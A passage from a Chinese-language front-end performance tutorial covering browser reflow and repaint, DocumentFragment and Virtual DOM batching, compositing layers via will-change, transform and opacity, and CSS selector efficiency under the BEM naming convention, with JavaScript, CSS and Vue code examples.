‘20px’</td><td align="left">后续兄弟元素</td></tr><tr><td align="left">内容变化</td><td align="left">elem.textContent &#x3D; ‘new’</td><td align="left">整个文档流</td></tr><tr><td align="left">添加&#x2F;删除DOM</td><td align="left">parent.appendChild(newElem)</td><td align="left">父元素及后续元素</td></tr><tr><td align="left">获取布局信息</td><td align="left">elem.offsetHeight</td><td align="left">强制同步重排</td></tr><tr><td align="left">窗口缩放</td><td align="left">window.resize</td><td align="left">整个文档</td></tr></tbody></table><p><strong>触发重绘的操作清单</strong></p><table><thead><tr><th align="left">操作类型</th><th align="left">具体示例</th><th align="left">性能开销</th></tr></thead><tbody><tr><td align="left">颜色变化</td><td align="left">elem.style.color &#x3D; ‘red’</td><td align="left">低</td></tr><tr><td align="left">背景变化</td><td align="left">elem.style.background &#x3D; ‘blue’</td><td align="left">中</td></tr><tr><td align="left">阴影变化</td><td align="left">elem.style.boxShadow &#x3D; …</td><td align="left">中</td></tr><tr><td align="left">轮廓变化</td><td align="left">elem.style.outline &#x3D; ‘1px solid’</td><td align="left">低</td></tr><tr><td align="left">透明度变化</td><td align="left">elem.style.opacity &#x3D; 0.5</td><td align="left">低（触发合成层）</td></tr></tbody></table><p><strong>优化策略：减少重排</strong></p><p>(1) 读写分离（批处理DOM操作）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误：交替读写触发多次重排</span><br><span class="hljs-keyword">const</span> width = element.<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// 读（强制重排）</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = width + <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <span class="hljs-comment">// 写</span><br><span class="hljs-keyword">const</span> height = element.<span class="hljs-property">offsetHeight</span>; <span class="hljs-comment">// 读（再次强制重排）</span><br><br><span class="hljs-comment">// 正确：先读后写</span><br><span class="hljs-keyword">const</span> width = element.<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// 集中读</span><br><span class="hljs-keyword">const</span> height = element.<span class="hljs-property">offsetHeight</span>;<br>element.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = width + <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <span class="hljs-comment">// 集中写</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">height</span> = height + <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;px&#x27;</span>;<br></code></pre></td></tr></table></figure><p>(2) 脱离文档流修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 方法1：使用display:none</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&#x27;none&#x27;</span>;<br><span class="hljs-comment">// 批量修改DOM</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">&#x27;block&#x27;</span>;<br><br><span class="hljs-comment">// 方法2：克隆修改后替换</span><br><span class="hljs-keyword">const</span> clone = element.<span class="hljs-title function_">cloneNode</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 修改克隆体</span><br>parent.<span class="hljs-title function_">replaceChild</span>(clone, element);<br><br><span class="hljs-comment">// 方法3：绝对定位脱离文档流</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">&#x27;absolute&#x27;</span>;<br>element.<span class="hljs-property">style</span>.<span class="hljs-property">left</span> = <span class="hljs-string">&#x27;1000px&#x27;</span>; <span class="hljs-comment">// 移出视口</span><br><span class="hljs-comment">// 安全修改</span><br></code></pre></td></tr></table></figure><p>(3) 使用CSS transform替代位置变化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误：触发重排</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">left</span> = <span class="hljs-string">&#x27;100px&#x27;</span>;<br><br><span class="hljs-comment">// 正确：仅触发合成（跳过重排重绘）</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">&#x27;translateX(100px)&#x27;</span>;<br></code></pre></td></tr></table></figure><p><strong>优化策略：减少重绘</strong></p><p>(1) 合并样式修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 错误：多次重绘</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">color</span> = <span class="hljs-string">&#x27;red&#x27;</span>;<br>element.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&#x27;blue&#x27;</span>;<br><br><span class="hljs-comment">// 正确：单次重绘</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = <span class="hljs-string">&#x27;color:red; background:blue;&#x27;</span>; <br><br><span class="hljs-comment">// 或使用class</span><br>element.<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">&#x27;active&#x27;</span>);<br></code></pre></td></tr></table></figure><p>(2) 使用 GPU 加速合成层</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 创建独立合成层 */</span><br><span class="hljs-selector-class">.optimized</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform; <span class="hljs-comment">/* 提前通知浏览器 */</span><br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">/* 强制提升到合成层 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) 避免频繁修改盒阴影</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 高开销属性 */</span><br><span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>);<br><br><span class="hljs-comment">/* 优化方案 */</span><br><span class="hljs-comment">/* 方案1：缩小阴影范围 */</span><br><span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">5px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.3</span>);<br><br><span class="hljs-comment">/* 方案2：使用伪元素独立层 */</span><br><span class="hljs-selector-class">.element</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-number">20px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>);<br>  <span class="hljs-attribute">z-index</span>: -<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>开发者诊断工具</strong></p><p>Chrome DevTools 性能分析：</p><ul><li>Performance 面板：<ul><li>紫色块：Layout（重排）</li><li>绿色块：Paint（重绘）</li></ul></li><li>渲染调试工具：<ul><li>Paint flashing：绿色闪烁区域 &#x3D; 重绘发生位置</li><li>Layout Shift Regions：蓝色区域 &#x3D; 布局偏移</li></ul></li></ul><p><strong>框架级优化</strong></p><p>(1) React 避免策略</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-comment">// 错误：内联对象每次渲染都是新引用</span><br>&lt;div style=&#123;&#123; <span class="hljs-attr">margin</span>: <span class="hljs-number">10</span> &#125;&#125;&gt;...&lt;/div&gt;<br><br><span class="hljs-comment">// 正确：提取常量</span><br><span class="hljs-keyword">const</span> style = &#123; <span class="hljs-attr">margin</span>: <span class="hljs-number">10</span> &#125;;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&#123;style&#125;</span>&gt;</span>...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><br><span class="hljs-comment">// 使用React.memo避免不必要渲染</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">MemoComp</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">() =&gt;</span> &#123;...&#125;);<br></code></pre></td></tr></table></figure><p>(2) Vue 优化方案</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;template&gt;<br>  &lt;!-- 错误：v-if频繁切换触发重排 --&gt;<br>  &lt;div v-if=&quot;show&quot;&gt;内容A&lt;/div&gt;<br>  &lt;div v-else&gt;内容B&lt;/div&gt;<br>  <br>  &lt;!-- 正确：v-show仅触发重绘 --&gt;<br>  &lt;div v-show=&quot;show&quot;&gt;内容A&lt;/div&gt;<br>  &lt;div v-show=&quot;!show&quot;&gt;内容B&lt;/div&gt;<br>&lt;/template&gt;<br></code></pre></td></tr></table></figure><h3 id="批量DOM更新：DocumentFragment-Virtual-DOM"><a href="#批量DOM更新：DocumentFragment-Virtual-DOM" class="headerlink" title="批量DOM更新：DocumentFragment &#x2F; Virtual DOM"></a>批量DOM更新：DocumentFragment &#x2F; Virtual DOM</h3><p><strong>批量更新的核心价值</strong></p><ul><li>减少重排次数：将多次DOM操作合并为单次</li><li>性能提升：避免频繁布局计算和渲染</li><li>应用场景：动态列表渲染、大规模UI更新</li></ul><p><strong>DocumentFragment：原生批量更新</strong></p><p>核心机制：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建文档片段（内存DOM容器）</span><br><span class="hljs-keyword">const</span> fragment = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createDocumentFragment</span>();<br><br><span class="hljs-comment">// 批量添加元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>  <span class="hljs-keyword">const</span> item = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;div&#x27;</span>);<br>  item.<span class="hljs-property">textContent</span> = <span class="hljs-string">`Item <span class="hljs-subst">$&#123;i&#125;</span>`</span>;<br>  fragment.<span class="hljs-title function_">appendChild</span>(item);<br>&#125;<br><br><span class="hljs-comment">// 单次插入真实DOM</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;list&#x27;</span>).<span class="hljs-title function_">appendChild</span>(fragment);<br></code></pre></td></tr></table></figure><ul><li>内存操作：在文档片段中的操作不会触发重排&#x2F;重绘</li><li>原子提交：片段插入真实DOM时仅触发单次重排</li></ul><p><strong>Virtual DOM：框架级优化</strong></p><p>工作原理：</p><pre class="mermaid">graph LR    A[状态变化] --> B[生成新Virtual DOM]    B --> C{对比差异}    C -->|有变化| D[计算最小更新]    C -->|无变化| E[跳过更新]    D --> F[批量更新真实DOM]</pre><p>关键优势：</p><ul><li>差异比对（Diffing）：仅更新变化部分</li><li>批处理：合并多个状态变更</li><li>跨平台：抽象渲染逻辑（Web&#x2F;iOS&#x2F;Android）</li></ul><p><strong>实现模式对比</strong></p><table><thead><tr><th align="left">维度</th><th align="left">DocumentFragment</th><th align="left">Virtual DOM</th></tr></thead><tbody><tr><td align="left">操作层级</td><td align="left">真实DOM节点</td><td align="left">内存中的轻量对象</td></tr><tr><td align="left">更新粒度</td><td align="left">子树级</td><td align="left">组件级</td></tr><tr><td align="left">语法复杂度</td><td align="left">原生API（简单）</td><td align="left">需框架支持（复杂）</td></tr><tr><td align="left">适用场景</td><td align="left">局部DOM更新</td><td align="left">整个应用状态管理</td></tr><tr><td align="left">内存开销</td><td align="left">低（临时容器）</td><td align="left">中（维护虚拟树）</td></tr></tbody></table><p><strong>React Virtual DOM 实现</strong></p><p>(1) JSX 编译结果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 原始JSX</span><br>&lt;div className=<span class="hljs-string">&quot;title&quot;</span>&gt;<span class="hljs-title class_">Hello</span>&lt;/div&gt;<br><br><span class="hljs-comment">// 编译为虚拟DOM对象</span><br>&#123;<br>  <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;div&#x27;</span>,<br>  <span class="hljs-attr">props</span>: &#123; <span class="hljs-attr">className</span>: <span class="hljs-string">&#x27;title&#x27;</span> &#125;,<br>  <span class="hljs-attr">children</span>: [<span class="hljs-string">&#x27;Hello&#x27;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) Diffing 算法优化</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 键值优化列表对比</span><br><span class="hljs-keyword">const</span> list = items.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> (<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Item</span> <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;item.id&#125;</span> <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;item&#125;</span> /&gt;</span></span> <span class="hljs-comment">// key避免全量重渲染</span><br>));<br><br><span class="hljs-comment">// 更新策略</span><br><span class="hljs-keyword">if</span> (prev.<span class="hljs-property">type</span> === next.<span class="hljs-property">type</span>) &#123;<br>  <span class="hljs-comment">// 同类型组件：更新属性</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// 不同类型：卸载重建</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="复合层优化：will-change-transform-opacity"><a href="#复合层优化：will-change-transform-opacity" class="headerlink" title="复合层优化：will-change, transform, opacity"></a>复合层优化：will-change, transform, opacity</h3><p><strong>浏览器渲染层叠模型</strong></p><pre class="mermaid">graph TB    A[DOM树] --> B[布局树]    B --> C[分层]    C --> D[绘制列表]    D --> E[栅格化]    E --> F[合成显示]</pre><ol><li>复合层（Compositing Layer）：浏览器将页面划分为独立图层</li><li>合成（Composition）：GPU直接混合图层生成最终画面</li><li>关键优势：修改特定属性可跳过布局和绘制阶段</li></ol><p><strong>触发复合层的CSS属性</strong></p><p>核心三剑客：</p><table><thead><tr><th align="left">属性</th><th align="left">优化原理</th><th align="left">使用示例</th></tr></thead><tbody><tr><td align="left">transform</td><td align="left">创建独立位图，GPU直接处理位移&#x2F;缩放&#x2F;旋转</td><td align="left">transform: translateX(100px)</td></tr><tr><td align="left">opacity</td><td align="left">GPU混合透明度，无需重绘底层内容</td><td align="left">opacity: 0.5</td></tr><tr><td align="left">will-change</td><td align="left">提前声明变化属性，浏览器预分配资源</td><td align="left">will-change: transform</td></tr></tbody></table><p>其他触发属性：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 创建新层 */</span><br><span class="hljs-attribute">position</span>: fixed;<br><span class="hljs-attribute">backface-visibility</span>: hidden;<br><span class="hljs-attribute">perspective</span>: <span class="hljs-number">1000px</span>;<br><span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">5px</span>); <span class="hljs-comment">/* 部分浏览器 */</span><br><span class="hljs-attribute">mask</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">...</span>);<br></code></pre></td></tr></table></figure><p><strong>will-change 深度解析</strong></p><p>正确做法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.optimized</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform; <span class="hljs-comment">/* 限定具体属性 */</span><br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span>;<br>&#125;<br><span class="hljs-selector-class">.optimized</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>错误做法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 错误1：声明过多属性 */</span><br><span class="hljs-attribute">will-change</span>: transform, opacity, top, left; <span class="hljs-comment">/* 过度消耗内存 */</span><br><br><span class="hljs-comment">/* 错误2：全局应用 */</span><br>* &#123; <span class="hljs-attribute">will-change</span>: transform; &#125; <span class="hljs-comment">/* 严重性能问题 */</span><br><br><span class="hljs-comment">/* 错误3：不配合实际变化 */</span><br><span class="hljs-comment">/* 浏览器预备资源但未使用 */</span><br></code></pre></td></tr></table></figure><p>声明周期管理：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 交互前启用</span><br>element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;mouseenter&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">willChange</span> = <span class="hljs-string">&#x27;transform&#x27;</span>;<br>&#125;);<br><br><span class="hljs-comment">// 交互后释放</span><br>element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;transitionend&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  element.<span class="hljs-property">style</span>.<span class="hljs-property">willChange</span> = <span class="hljs-string">&#x27;auto&#x27;</span>;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>Transform 与 Opacity 优化机制</strong></p><p>GPU 加速原理：</p><pre class="mermaid">sequenceDiagram    Browser->>GPU: 提交图层位图    Browser->>GPU: 发送变换指令(transform/opacity)    GPU->>Display: 直接合成最终画面</pre><ul><li>跳过关键路径：避免重排（Layout）和重绘（Paint）</li><li>60fps保障：GPU合成耗时通常小于3ms&#x2F;帧</li></ul><p><strong>浏览器层创建规则</strong></p><p>Chrome 层类型：</p><table><thead><tr><th align="left">层类型</th><th align="left">触发条件</th><th align="left">内存开销</th></tr></thead><tbody><tr><td align="left">根层</td><td align="left">页面根元素</td><td align="left">必需</td></tr><tr><td align="left">显式层</td><td align="left">will-change&#x2F;transform等</td><td align="left">中</td></tr><tr><td align="left">重叠层</td><td align="left">层叠上下文（z-index）</td><td align="left">低</td></tr><tr><td align="left">滚动层</td><td align="left">overflow: scroll</td><td align="left">高</td></tr></tbody></table><p>内存成本计算：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Text">内存占用 = 层宽度 × 高度 × 4字节（RGBA）<br>示例：1920x1080层 ≈ 1920×1080×4 ≈ 8MB<br></code></pre></td></tr></table></figure><p><strong>调试工具分析</strong></p><p>Chrome DevTools：</p><ul><li>Layers 面板：<ul><li>可视化所有复合层</li><li>查看层尺寸&#x2F;内存占用&#x2F;创建原因</li></ul></li><li>Rendering 面板：<ul><li>开启 Layer borders：橙色边框&#x3D;复合层</li><li>Scrolling performance：标记滚动层问题</li></ul></li></ul><h2 id="3-2-高效CSS实践"><a href="#3-2-高效CSS实践" class="headerlink" title="3.2 高效CSS实践"></a>3.2 高效CSS实践</h2><h3 id="选择器性能：BEM-约束深度"><a href="#选择器性能：BEM-约束深度" class="headerlink" title="选择器性能：BEM 约束深度"></a>选择器性能：BEM 约束深度</h3><p><strong>CSS选择器匹配机制</strong></p><p>浏览器解析顺序：</p><pre class="mermaid">graph RL    A[.nav__item--active] --> B[--active修饰符]    A --> C[__item元素]    A --> D[.nav块]    D --> E[样式规则]</pre><ul><li>从右向左解析：浏览器先匹配最右侧选择器（如.nav__item–active）</li><li>关键路径：查找所有 –active 类 → 筛选含 __item 的元素 → 验证父级有 .nav</li></ul><p>性能消耗公式：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Text">选择器开销 = 匹配步骤数 × 文档元素数量<br></code></pre></td></tr></table></figure><p><strong>BEM命名规范核心</strong></p><p>结构定义：</p><table><thead><tr><th align="left">部分</th><th align="left">语法</th><th align="left">示例</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Block</td><td align="left">.block</td><td align="left">.nav</td><td align="left">独立功能模块</td></tr><tr><td align="left">Element</td><td align="left">__element</td><td align="left">.nav__item</td><td align="left">块的组成部分</td></tr><tr><td align="left">Modifier</td><td align="left">–modifier</td><td align="left">.nav__item–active</td><td align="left">状态&#x2F;变体</td></tr></tbody></table><p>深度约束原则:</p><p>(1) 禁止嵌套：元素选择器不依赖祖先结构</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 错误：依赖结构 */</span><br><span class="hljs-selector-class">.nav</span> <span class="hljs-selector-class">.item</span> <span class="hljs-selector-class">.text</span> &#123; ... &#125;<br><br><span class="hljs-comment">/* 正确：BEM扁平化 */</span><br><span class="hljs-selector-class">.nav__text</span> &#123; ... &#125;<br></code></pre></td></tr></table></figure><p>(2) 最大深度：选择器不超过3个部分</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 有效BEM */</span><br><span class="hljs-selector-class">.block__element--modifier</span> <br><br><span class="hljs-comment">/* 无效（超过3部分） */</span><br><span class="hljs-selector-class">.block__element__subelement--modifier</span><br></code></pre></td></tr></table></figure><p><strong>BEM性能优势原理</strong></p><p>(1) 减少匹配步骤</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 传统嵌套（4步匹配） */</span><br><span class="hljs-selector-tag">nav</span> <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> &#123; ... &#125; <br><span class="hljs-comment">/* 匹配过程：1.所有a → 2.在li内 → 3.在ul内 → 4.在nav内 */</span><br><br><span class="hljs-comment">/* BEM等效（1步匹配） */</span><br><span class="hljs-selector-class">.nav__link</span> &#123; ... &#125;<br><span class="hljs-comment">/* 匹配过程：1.所有.nav__link元素 */</span><br></code></pre></td></tr></table></figure><p>(2) 降低样式冲突</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 传统方式：可能意外影响其他区域 */</span><br><span class="hljs-selector-class">.content</span> <span class="hljs-selector-class">.title</span> &#123; <span class="hljs-attribute">color</span>: blue; &#125;<br><br><span class="hljs-comment">/* BEM：作用域隔离 */</span><br><span class="hljs-selector-class">.content__title</span> &#123; <span class="hljs-attribute">color</span>: blue; &#125; <span class="hljs-comment">/* 只影响content块内 */</span><br><span class="hljs-selector-class">.product__title</span> &#123; <span class="hljs-attribute">color</span>: red; &#125;  <span class="hljs-comment">/* 独立作用域 */</span><br></code></pre></td></tr></table></figure><p>(3) 避免过度修饰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 冗余选择器 */</span><br><span class="hljs-selector-tag">button</span><span class="hljs-selector-class">.btn</span><span class="hljs-selector-class">.primary</span> &#123; ... &#125; <span class="hljs-comment">/* 特异性过高 */</span><br><br><span class="hljs-comment">/* BEM简化 */</span><br><span class="hljs-selector-class">.btn--primary</span> &#123; ... &#125; <span class="hljs-comment">/* 特异性保持低位 */</span><br></code></pre></td></tr></table></figure><p><strong>BEM实施规范</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 正确：符合BEM层级 --&gt;<br>&lt;nav class=&quot;nav&quot;&gt;<br>  &lt;ul class=&quot;nav__list&quot;&gt;<br>    &lt;li class=&quot;nav__item&quot;&gt;<br>      &lt;a class=&quot;nav__link nav__link--active&quot;&gt;首页&lt;/a&gt;<br>    &lt;/li&gt;<br>  &lt;/ul&gt;<br>&lt;/nav&gt;<br><br>&lt;!-- 错误：元素嵌套过深 --&gt;<br>&lt;div class=&quot;nav&quot;&gt;<br>  &lt;ul&gt;<br>    &lt;li&gt;<br>      &lt;a class=&quot;nav-link-active&quot;&gt;首页&lt;/a&gt;<br>    &lt;/li&gt;<br>  &lt;/ul&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs CSS">// SASS实现<br>// BEM规范写法<br><span class="hljs-selector-class">.nav</span> &#123;<br>  &amp;__list &#123; ... &#125;<br>  <br>  &amp;__item &#123;<br>    &amp;<span class="hljs-attr">--active</span> &#123; ... &#125; // 修饰符<br>  &#125;<br>  <br>  &amp;__link &#123;<br>    &amp;<span class="hljs-selector-pseudo">:hover</span> &#123; ... &#125; // 伪状态<br>  